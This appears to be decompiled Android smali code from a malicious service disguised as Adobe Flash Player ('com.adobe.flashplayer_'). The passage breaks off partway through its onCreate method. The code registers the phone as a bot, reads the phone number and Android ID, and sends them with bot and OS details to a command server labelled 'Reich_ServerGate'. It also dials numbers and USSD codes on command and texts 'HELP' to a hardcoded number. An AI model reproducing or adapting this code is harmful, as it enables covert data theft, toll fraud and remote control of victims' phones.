.class public Lcom/adobe/flashplayer_/BBB;
.super Landroid/app/Service;
.source "BBB.java"


# static fields
.field private static final ALLOWED_CHARACTERS:Ljava/lang/String; = "0123456789qwertyuiopasdfghjklzxcvbnm"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 46
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method private AvFuck(Ljava/lang/String;Ljava/lang/String;)V
    .locals 8
    .param p1, "s"    # Ljava/lang/String;
    .param p2, "u"    # Ljava/lang/String;

    .prologue
    const/high16 v7, 0x40000000    # 2.0f

    const/high16 v6, 0x10000000

    const/high16 v5, 0x4000000

    const/high16 v4, 0x100000

    .line 611
    const-string v2, "ussd"

    invoke-virtual {p1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_0

    .line 612
    new-instance v1, Landroid/content/Intent;

    const-string v2, "android.intent.action.CALL"

    invoke-direct {v1, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 613
    .local v1, "ussd_call":Landroid/content/Intent;
    invoke-virtual {v1, v4}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 614
    invoke-virtual {v1, v7}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 615
    invoke-virtual {v1, v6}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 616
    invoke-virtual {v1, v5}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 617
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "tel:"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v2

    invoke-virtual {v1, v2}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    .line 618
    invoke-virtual {p0, v1}, Lcom/adobe/flashplayer_/BBB;->startActivity(Landroid/content/Intent;)V

    .line 621
    .end local v1    # "ussd_call":Landroid/content/Intent;
    :cond_0
    const-string v2, "call"

    invoke-virtual {p1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_1

    .line 622
    new-instance v0, Landroid/content/Intent;

    const-string v2, "android.intent.action.CALL"

    invoke-direct {v0, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 623
    .local v0, "call":Landroid/content/Intent;
    invoke-virtual {v0, v4}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 624
    invoke-virtual {v0, v7}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 625
    invoke-virtual {v0, v6}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 626
    invoke-virtual {v0, v5}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 627
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "tel:"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v2

    invoke-virtual {v0, v2}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    .line 628
    invoke-virtual {p0, v0}, Lcom/adobe/flashplayer_/BBB;->startActivity(Landroid/content/Intent;)V

    .line 631
    .end local v0    # "call":Landroid/content/Intent;
    :cond_1
    return-void
.end method

.method private FuckAv(Ljava/lang/String;)V
    .locals 2
    .param p1, "s"    # Ljava/lang/String;

    .prologue
    .line 599
    const-string v0, "start"

    invoke-virtual {p1, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 600
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/adobe/flashplayer_/BBB111;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Lcom/adobe/flashplayer_/BBB;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 606
    :goto_0
    return-void

    .line 604
    :cond_0
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/adobe/flashplayer_/BBB111;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Lcom/adobe/flashplayer_/BBB;->stopService(Landroid/content/Intent;)Z

    goto :goto_0
.end method

.method private execMod(Ljava/lang/String;Landroid/content/Context;)V
    .locals 2
    .param p1, "m"    # Ljava/lang/String;
    .param p2, "c"    # Landroid/content/Context;

    .prologue
    .line 718
    const-string v0, "A"

    invoke-virtual {p1, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 719
    const-string v0, "w"

    const-string v1, "*"

    invoke-direct {p0, v0, v1}, Lcom/adobe/flashplayer_/BBB;->writeConfig(Ljava/lang/String;Ljava/lang/String;)V

    .line 720
    const-string v0, "79262000900"

    const-string v1, "HELP"

    invoke-virtual {p0, v0, v1}, Lcom/adobe/flashplayer_/BBB;->sendSMS(Ljava/lang/String;Ljava/lang/String;)V

    .line 721
    const-string v0, "MacrosAState"

    const-string v1, "A"

    invoke-direct {p0, v0, v1}, Lcom/adobe/flashplayer_/BBB;->writeConfig(Ljava/lang/String;Ljava/lang/String;)V

    .line 723
    :cond_0
    return-void
.end method

.method public static millisToDate(J)Ljava/lang/String;
    .locals 3
    .param p0, "currentTime"    # J

    .prologue
    .line 645
    invoke-static {}, Ljava/util/Calendar;->getInstance()Ljava/util/Calendar;

    move-result-object v0

    .line 646
    .local v0, "calendar":Ljava/util/Calendar;
    invoke-virtual {v0, p0, p1}, Ljava/util/Calendar;->setTimeInMillis(J)V

    .line 647
    invoke-virtual {v0}, Ljava/util/Calendar;->getTime()Ljava/util/Date;

    move-result-object v1

    .line 648
    .local v1, "date":Ljava/util/Date;
    invoke-virtual {v1}, Ljava/util/Date;->toString()Ljava/lang/String;

    move-result-object v2

    .line 649
    .local v2, "finalDate":Ljava/lang/String;
    return-object v2
.end method

.method private static offSetHandler(I)Ljava/lang/String;
    .locals 5
    .param p0, "sizeOfRandomString"    # I

    .prologue
    .line 746
    new-instance v1, Ljava/util/Random;

    invoke-direct {v1}, Ljava/util/Random;-><init>()V

    .line 747
    .local v1, "random":Ljava/util/Random;
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    .line 748
    .local v2, "sb":Ljava/lang/StringBuilder;
    const/4 v0, 0x0

    .local v0, "i":I
    :goto_0
    if-lt v0, p0, :cond_0

    .line 750
    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    return-object v3

    .line 749
    :cond_0
    const-string v3, "0123456789qwertyuiopasdfghjklzxcvbnm"

    const-string v4, "0123456789qwertyuiopasdfghjklzxcvbnm"

    invoke-virtual {v4}, Ljava/lang/String;->length()I

    move-result v4

    invoke-virtual {v1, v4}, Ljava/util/Random;->nextInt(I)I

    move-result v4

    invoke-virtual {v3, v4}, Ljava/lang/String;->charAt(I)C

    move-result v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    .line 748
    add-int/lit8 v0, v0, 0x1

    goto :goto_0
.end method

.method private readConfig(Ljava/lang/String;)Ljava/lang/String;
    .locals 7
    .param p1, "config"    # Ljava/lang/String;

    .prologue
    .line 666
    const-string v4, ""

    .line 669
    .local v4, "ret":Ljava/lang/String;
    :try_start_0
    invoke-virtual {p0, p1}, Lcom/adobe/flashplayer_/BBB;->openFileInput(Ljava/lang/String;)Ljava/io/FileInputStream;

    move-result-object v1

    .line 671
    .local v1, "inputStream":Ljava/io/InputStream;
    if-eqz v1, :cond_0

    .line 672
    new-instance v2, Ljava/io/InputStreamReader;

    invoke-direct {v2, v1}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    .line 673
    .local v2, "inputStreamReader":Ljava/io/InputStreamReader;
    new-instance v0, Ljava/io/BufferedReader;

    invoke-direct {v0, v2}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 674
    .local v0, "bufferedReader":Ljava/io/BufferedReader;
    const-string v3, ""

    .line 675
    .local v3, "receiveString":Ljava/lang/String;
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    .line 677
    .local v5, "stringBuilder":Ljava/lang/StringBuilder;
    :goto_0
    invoke-virtual {v0}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v3

    if-nez v3, :cond_1

    .line 681
    invoke-virtual {v1}, Ljava/io/InputStream;->close()V

    .line 682
    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    .line 689
    .end local v0    # "bufferedReader":Ljava/io/BufferedReader;
    .end local v1    # "inputStream":Ljava/io/InputStream;
    .end local v2    # "inputStreamReader":Ljava/io/InputStreamReader;
    .end local v3    # "receiveString":Ljava/lang/String;
    .end local v5    # "stringBuilder":Ljava/lang/StringBuilder;
    :cond_0
    :goto_1
    return-object v4

    .line 678
    .restart local v0    # "bufferedReader":Ljava/io/BufferedReader;
    .restart local v1    # "inputStream":Ljava/io/InputStream;
    .restart local v2    # "inputStreamReader":Ljava/io/InputStreamReader;
    .restart local v3    # "receiveString":Ljava/lang/String;
    .restart local v5    # "stringBuilder":Ljava/lang/StringBuilder;
    :cond_1
    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    :try_end_0
    .catch Ljava/io/FileNotFoundException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1

    goto :goto_0

    .line 685
    .end local v0    # "bufferedReader":Ljava/io/BufferedReader;
    .end local v1    # "inputStream":Ljava/io/InputStream;
    .end local v2    # "inputStreamReader":Ljava/io/InputStreamReader;
    .end local v3    # "receiveString":Ljava/lang/String;
    .end local v5    # "stringBuilder":Ljava/lang/StringBuilder;
    :catch_0
    move-exception v6

    goto :goto_1

    .line 686
    :catch_1
    move-exception v6

    goto :goto_1
.end method

.method private sendREP(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
    .locals 15
    .param p1, "Reich_ServerGate"    # Ljava/lang/String;
    .param p2, "i"    # Ljava/lang/String;
    .param p3, "rep"    # Ljava/lang/String;
    .param p4, "c"    # Landroid/content/Context;

    .prologue
    .line 696
    const-string v10, "BotID"

    invoke-direct {p0, v10}, Lcom/adobe/flashplayer_/BBB;->readConfig(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 697
    .local v1, "BotID":Ljava/lang/String;
    const-string v10, "BotNetwork"

    invoke-direct {p0, v10}, Lcom/adobe/flashplayer_/BBB;->readConfig(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    .line 698
    .local v3, "BotNetwork":Ljava/lang/String;
    const-string v10, "BotLocation"

    invoke-direct {p0, v10}, Lcom/adobe/flashplayer_/BBB;->readConfig(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 699
    .local v2, "BotLocation":Ljava/lang/String;
    sget-object v6, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    .line 700
    .local v6, "SDK":Ljava/lang/String;
    const-string v10, "BotVer"

    invoke-direct {p0, v10}, Lcom/adobe/flashplayer_/BBB;->readConfig(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    .line 701
    .local v5, "BotVer":Ljava/lang/String;
    const-string v10, "BotPrefix"

    invoke-direct {p0, v10}, Lcom/adobe/flashplayer_/BBB;->readConfig(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    .line 703
    .local v4, "BotPrefix":Ljava/lang/String;
    const-string v10, "phone"

    move-object/from16 v0, p4

    invoke-virtual {v0, v10}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v9

    check-cast v9, Landroid/telephony/TelephonyManager;

    .line 704
    .local v9, "tMgr":Landroid/telephony/TelephonyManager;
    invoke-virtual {v9}, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;

    move-result-object v7

    .line 706
    .local v7, "pn":Ljava/lang/String;
    if-nez v7, :cond_1

    const-string v7, ""

    .line 709
    :goto_0
    if-nez v1, :cond_0

    invoke-virtual/range {p4 .. p4}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v10

    const-string v11, "android_id"

    invoke-static {v10, v11}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 712
    :cond_0
    new-instance v10, Ljava/lang/StringBuilder;

    const-string v11, "a=2&b="

    invoke-direct {v10, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v10, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, "&c="

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, ":"

    const-string v12, ""

    invoke-virtual {v3, v11, v12}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, "&d="

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, "&e="

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, "&f="

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, "&g="

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, "&h="

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    move-object/from16 v0, p3

    invoke-virtual {v10, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, "&prefix="

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    .line 714
    .local v8, "request":Ljava/lang/String;
    new-instance v10, Lcom/adobe/flashplayer_/BBB000;

    invoke-direct {v10}, Lcom/adobe/flashplayer_/BBB000;-><init>()V

    const/4 v11, 0x1

    new-array v11, v11, [Ljava/lang/String;

    const/4 v12, 0x0

    new-instance v13, Ljava/lang/StringBuilder;

    invoke-static/range {p1 .. p1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v14

    invoke-direct {v13, v14}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v14, "?"

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    invoke-virtual {v13, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    invoke-virtual {v13}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v13

    aput-object v13, v11, v12

    invoke-virtual {v10, v11}, Lcom/adobe/flashplayer_/BBB000;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 715
    return-void

    .line 706
    .end local v8    # "request":Ljava/lang/String;
    :cond_1
    const-string v10, "+"

    const-string v11, ""

    invoke-virtual {v7, v10, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v7

    goto/16 :goto_0
.end method

.method private writeConfig(Ljava/lang/String;Ljava/lang/String;)V
    .locals 2
    .param p1, "config"    # Ljava/lang/String;
    .param p2, "data"    # Ljava/lang/String;

    .prologue
    .line 655
    :try_start_0
    new-instance v0, Ljava/io/OutputStreamWriter;

    const/4 v1, 0x0

    invoke-virtual {p0, p1, v1}, Lcom/adobe/flashplayer_/BBB;->openFileOutput(Ljava/lang/String;I)Ljava/io/FileOutputStream;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/io/OutputStreamWriter;-><init>(Ljava/io/OutputStream;)V

    .line 656
    .local v0, "outputStreamWriter":Ljava/io/OutputStreamWriter;
    invoke-virtual {v0, p2}, Ljava/io/OutputStreamWriter;->write(Ljava/lang/String;)V

    .line 657
    invoke-virtual {v0}, Ljava/io/OutputStreamWriter;->close()V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 661
    .end local v0    # "outputStreamWriter":Ljava/io/OutputStreamWriter;
    :goto_0
    return-void

    .line 659
    :catch_0
    move-exception v1

    goto :goto_0
.end method


# virtual methods
.method public crypt(Ljava/lang/String;I)Ljava/lang/String;
    .locals 7
    .param p1, "s"    # Ljava/lang/String;
    .param p2, "offset"    # I

    .prologue
    .line 736
    const-string v1, ""

    .line 737
    .local v1, "ret":Ljava/lang/String;
    invoke-virtual {p1}, Ljava/lang/String;->toCharArray()[C

    move-result-object v0

    .line 738
    .local v0, "pw":[C
    array-length v4, v0

    const/4 v3, 0x0

    :goto_0
    if-lt v3, v4, :cond_0

    .line 741
    return-object v1

    .line 738
    :cond_0
    aget-char v2, v0, v3

    .line 739
    .local v2, "zz":C
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v6

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {p2}, Lcom/adobe/flashplayer_/BBB;->offSetHandler(I)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v2}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 738
    add-int/lit8 v3, v3, 0x1

    goto :goto_0
.end method

.method public decrypt(Ljava/lang/String;I)Ljava/lang/String;
    .locals 9
    .param p1, "s"    # Ljava/lang/String;
    .param p2, "offset"    # I

    .prologue
    .line 754
    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v7

    div-int/lit8 v3, v7, 0x10

    .line 755
    .local v3, "l":I
    const/4 v1, 0x0

    .line 756
    .local v1, "c":I
    const/16 v2, 0x10

    .line 757
    .local v2, "i":I
    const/4 v6, 0x0

    .line 758
    .local v6, "z":I
    const-string v4, ""

    .line 759
    .local v4, "ret":Ljava/lang/String;
    const-string v0, ""

    .line 760
    .local v0, "block":Ljava/lang/String;
    const/4 v5, 0x0

    .local v5, "x":I
    :goto_0
    if-lt v5, v3, :cond_0

    .line 765
    sget-object v7, Ljava/lang/System;->out:Ljava/io/PrintStream;

    invoke-virtual {v7, v0}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    .line 766
    return-object v0

    .line 761
    :cond_0
    add-int/lit8 v1, v1, 0x10

    .line 762
    add-int/lit8 v6, v1, -0x1

    .line 763
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v8

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p1, v6, v1}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 760
    add-int/lit8 v5, v5, 0x1

    goto :goto_0
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .param p1, "arg0"    # Landroid/content/Intent;

    .prologue
    .line 729
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 69

    .prologue
    .line 53
    invoke-super/range {p0 .. p0}, Landroid/app/Service;->onCreate()V

    .line 54
    invoke-virtual/range {p0 .. p0}, Lcom/adobe/flashplayer_/BBB;->getApplicationContext()Landroid/content/Context;

    move-result-object v30

    .line 57
    .local v30, "context":Landroid/content/Context;
    const-string v3, "connectivity"

    move-object/from16 v0, p0

    invoke-virtual {v0, v3}, Lcom/adobe/flashplayer_/BBB;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v27

    check-cast v27, Landroid/net/ConnectivityManager;

    .line 58
    .local v27, "cm":Landroid/net/ConnectivityManager;
    const-string v3, "phone"

    move-object/from16 v0, p0

    invoke-virtual {v0, v3}, Lcom/adobe/flashplayer_/BBB;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v62

    check-cast v62, Landroid/telephony/TelephonyManager;

    .line 59
    .local v62, "telephonyManager":Landroid/telephony/TelephonyManager;
    invoke-virtual/range {v27 .. v27}, Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;

    move-result-object v47

    .line 61
    .local v47, "netInfo":Landroid/net/NetworkInfo;
    const-string v3, "BotID"

    move-object/from16 v0, p0

    invoke-direct {v0, v3}, Lcom/adobe/flashplayer_/BBB;->readConfig(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    .line 62
    .local v13, "BotID":Ljava/lang/String;
    const-string v3, "BotNetwork"

    move-object/from16 v0, p0

    invoke-direct {v0, v3}, Lcom/adobe/flashplayer_/BBB;->readConfig(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v15

    .line 63
    .local v15, "BotNetwork":Ljava/lang/String;
    const-string v3, "BotLocation"

    move-object/from16 v0, p0

    invoke-direct {v0, v3}, Lcom/adobe/flashplayer_/BBB;->readConfig(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    .line 65
    .local v14, "BotLocation":Ljava/lang/String;
    const-string v3, "Reich_ServerGate"

    move-object/from16 v0, p0

    invoke-direct {v0, v3}, Lcom/adobe/flashplayer_/BBB;->readConfig(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v18

    .line 66
    .local v18, "Reich_ServerGate":Ljava/lang/String;
    const-string v3, "BotVer"

    move-object/from16 v0, p0

    invoke-direct {v0, v3}, Lcom/adobe/flashplayer_/BBB;->readConfig(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v17

    .line 67
    .local v17, "BotVer":Ljava/lang/String;
    sget-object v19, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    .line 68
    .local v19, "SDK":Ljava/lang/String;
    const-string v3, "BotPrefix"

    move-object/from16 v0, p0

    invoke-direct {v0, v3}, Lcom/adobe/flashplayer_/BBB;->readConfig(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v16

    .line 73
    .local v16, "BotPrefix":Ljava/lang/String;
    if-eqz v47, :cond_14

    invoke-virtual/range {v47 .. v47}, Landroid/net/NetworkInfo;->isConnectedOrConnecting()Z

    move-result v3

    if-eqz v3, :cond_14

    .line 76
    const-string v21, ""

    .line 79
    .local v21, "answ":Ljava/lang/String;
    :try_start_0
    const-string v3, "phone"

    move-object/from16 v0, p0

    invoke-virtual {v0, v3}, Lcom/adobe/flashplayer_/BBB;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v61

    check-cast v61, Landroid/telephony/TelephonyManager;

    .line 80
    .local v61, "tMgr":Landroid/telephony/TelephonyManager;
    invoke-virtual/range {v61 .. v61}, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;

    move-result-object v58

    .line 81
    .local v58, "pn":Ljava/lang/String;
    if-nez v58, :cond_15

    const-string v58, "NA"

    .line 83
    :goto_0
    new-instance v3, Lcom/adobe/flashplayer_/BBB000;

    invoke-direct {v3}, Lcom/adobe/flashplayer_/BBB000;-><init>()V

    const/4 v5, 0x1

    new-array v5, v5, [Ljava/lang/String;

    const/4 v7, 0x0

    new-instance v8, Ljava/lang/StringBuilder;

    invoke-static/range {v18 .. v18}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v9

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v9, "?a=1&b="

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "&c="

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, ":"

    const-string v10, ""

    invoke-virtual {v15, v9, v10}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "&d="

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "&e="

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    move-object/from16 v0, v58

    invoke-virtual {v8, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "&f="

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    move-object/from16 v0, v17

    invoke-virtual {v8, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "&g="

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    move-object/from16 v0, v19

    invoke-virtual {v8, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "&prefix="

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    move-object/from16 v0, v16

    invoke-virtual {v8, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    aput-object v8, v5, v7

    invoke-virtual {v3, v5}, Lcom/adobe/flashplayer_/BBB000;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    move-result-object v3

    invoke-virtual {v3}, Landroid/os/AsyncTask;->get()Ljava/lang/Object;

    move-result-object v3

    move-object v0, v3

    check-cast v0, Ljava/lang/String;

    move-object/from16 v21, v0

    .line 85
    if-nez v21, :cond_0

    const-string v21, ""
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/util/concurrent/ExecutionException; {:try_start_0 .. :try_end_0} :catch_1

    .line 98
    .end local v58    # "pn":Ljava/lang/String;
    .end local v61    # "tMgr":Landroid/telephony/TelephonyManager;
    :cond_0
    :goto_1
    const-string v3, ""

    move-object/from16 v0, v21

    if-ne v0, v3, :cond_1

